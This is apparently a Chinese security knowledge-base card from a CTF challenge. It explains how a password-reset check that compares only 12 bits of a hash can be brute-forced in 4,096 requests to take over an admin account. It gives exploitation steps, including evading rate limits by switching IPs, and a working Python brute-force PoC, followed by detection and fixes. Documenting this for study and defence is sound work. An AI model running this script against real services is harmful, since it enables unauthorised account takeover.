---
id: web-generic-auth-password-reset-hash-low12-bruteforce
title: 密码重置只比较 hash 低 12 位：枚举 4096 个旧密码后三字节接管 admin
type: scenario
domain: web
path: web/generic/auth
technique: password-reset-hash-low12-bruteforce
aliases:
- hash 低 12 位密码重置
- 密码重置截断比较
- 4096 爆破旧密码
- hash & 0xfff
- 后三字节比较
- FastAPI 密码重置绕过
tags:
- auth
- password-reset
- hash
- bruteforce
- weak-comparison
- admin-takeover
- python
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V152
  verified_at: '2026-11-06T07:36:05+08:00'
  notes: 已对照原文代码与图02核对：target=hash(password)&0xfff、输入后3字节 big-endian、4096 枚举空间、无登录要求、图02 显示 2400/4095 命中 target_value=2529 且 admin 密码改为 gemini_pwned_123，均一致。未验证点：未在靶机复跑（Python hash 受进程随机盐影响但同进程稳定，逻辑成立）；CTF 题无组件版本，未设 versions；frontmatter 无 sources/source_url。
---

## 一句话结论

密码重置接口把 `hash(原密码) & 0xfff`（仅 12 位）作为校验目标，再把用户输入旧密码的“后 3 个 latin-1 字节”转成整数比较；由于 12 位目标只有 4096 种，攻击者用 `\x00` 前缀把输入值限制在 0–4095，逐值请求即可在 4096 次内命中并把 admin 密码改成任意值，随后登录接管。

## 原理

- 校验逻辑：
  - `target_value = hash(users[username]["password"]) & 0xfff`，只保留 Python `hash()` 的低 12 位；
  - `input_bytes = data.old_password.encode('latin-1')[-3:].rjust(3, b'\x00')`，取输入最后 3 字节并按大端转整数；
  - `if data.old_password == 原密码 or input_value == target_value: 重置密码`。
- `target_value` 范围是 0–4095（0x000–0xFFF）。`input_value` 是 24 位（0–0xFFFFFF）；只有最高字节为 `\x00` 时，`input_value` 才可能等于 12 位的 target。因此候选输入是 `"\x00" + 两字节`，共 4096 个。
- Python 的 `hash()` 带进程级随机盐（`PYTHONHASHSEED`），但同一进程内对同一字符串稳定；攻击者不需要知道盐，只需把 4096 个候选逐个提交，接口的成功/失败就是 12 位 oracle。
- 为什么能重置 admin：接口只按 `username` 查用户，不要求请求者已登录或拥有该账号；命中后直接写入 `new_password`，随后用 admin + 新密码登录。
- 这是“截断校验”的典型：把完整秘密的 12 位当成等价凭证，熵从“未知密码”降到 12 位；且没有速率限制/失败锁定，4096 次请求成本极低。
- 原文实测：脚本打印 `1400/4095... 2400/4095...`，命中 `target_value=2529`，admin 密码被重置为 `gemini_pwned_123`。

## 触发条件

- 密码重置/修改接口用 `hash(password)`、MD5/SHA 等哈希的“低 N 位/前 N 位/后 3 字节”做比较，而不是完整密码或一次性 token。
- 比较位数足够小（本例 12 位），可在合理请求量内枚举。
- 接口无速率限制、账号锁定、验证码或来源校验；或限制可按 IP/会话绕过。
- 输入字段允许 latin-1/JSON `\u0000` 等任意字节（至少允许 NUL 作为前缀）。
- 目标用户名已知（如 admin）。

## 利用步骤

1. 审计重置接口：找到 `hash(...) & mask`、`substr`、`[:N]`、`[-3:]` 等截断比较，计算有效位数 `bits` 与候选空间 `2^bits`。
2. 构造输入：若比较的是“后 3 字节转整数”，用 `\x00` 作为最高字节，把值限制在 `0..2^12-1`；若比较的是十六进制前缀，按前缀长度枚举。
3. 写脚本循环候选值，POST `/reset_password`（或等价接口），以响应状态/文案/跳转判断成功。
4. 命中后立即用 `new_password` 登录目标账号，验证权限（如 admin 面板）。
5. 若接口有速率限制，降低并发、加延迟或换源 IP；避免触发锁定影响业务。
6. 授权测试中只重置为临时强密码，记录证据后恢复/通知。

## PoC

```python
import requests

BASE = "http://target:8000"
username = "admin"
new_password = "Temp_Str0ng_Pass!"

for v in range(4096):
    old = b"\x00" + v.to_bytes(2, "big")   # 最高字节 0，值域 0..4095
    r = requests.post(
        f"{BASE}/reset_password",
        json={
            "username": username,
            "old_password": old.decode("latin-1"),
            "new_password": new_password,
        },
        timeout=5,
    )
    if r.status_code == 200 and "successful" in r.text:
        print(f"[+] hit target_value={v}, admin password reset")
        break
else:
    print("[-] no hit; check comparison width / encoding")

# 登录验证
s = requests.Session()
print(s.post(f"{BASE}/login", json={"username": username, "password": new_password}).text)
```

说明：JSON 中的 `\u0000` 会被序列化为 NUL 字符；若目标用表单而非 JSON，需按表单编码提交 `%00`。原文比较的是 `hash & 0xfff`，因此 4096 次足够。

## 变体与关联

- 变体：比较 `hash & 0xff`（256 次）、`hash & 0xffff`（65536 次）、MD5 前 6 位十六进制（16^6）等；按实际截断位数计算空间。
- 变体：比较 `hash(password) % 1000`、密码长度、首字母等弱校验；同样是低熵 oracle。
- 变体：接口返回统一 200 但通过页面文案/跳转差异区分成功，脚本需按实际响应调整判据。
- 关联：[[web-generic-auth-dev-reset-admin-password-default]]（开发重置接口默认密码）；[[web-generic-auth-password-reset-username-tampering]]（重置接口用户名可篡改）；[[web-generic-auth-weak-security-question-reset]]（弱安全问题重置）。
- 关联：拿到 admin 后常接业务逻辑漏洞（如转账不扣款）或后台 RCE；本卡只覆盖重置绕过本身。

## 检测与防御

- 修复：密码重置必须使用高熵、一次性、短时效的重置 token（绑定用户与用途），不要比较密码哈希的任何截断值。
- 修复：如果必须校验旧密码，比较完整密码哈希并使用常量时间比较；不要用 Python 内置 `hash()` 存储/校验密码（应使用 bcrypt/argon2/scrypt）。
- 防御：重置接口加速率限制、失败锁定、验证码、登录态/二次认证；对同一账号的连续失败告警。
- 检测：同一 IP/会话对 `/reset_password` 的高频请求（数百到数千次）、连续不同 `old_password` 后突然成功、admin 密码被修改且来源异常。
- 响应：立即重置 admin 密码、失效所有会话、审计该账号在重置后的操作；排查其他使用相同截断比较的接口。
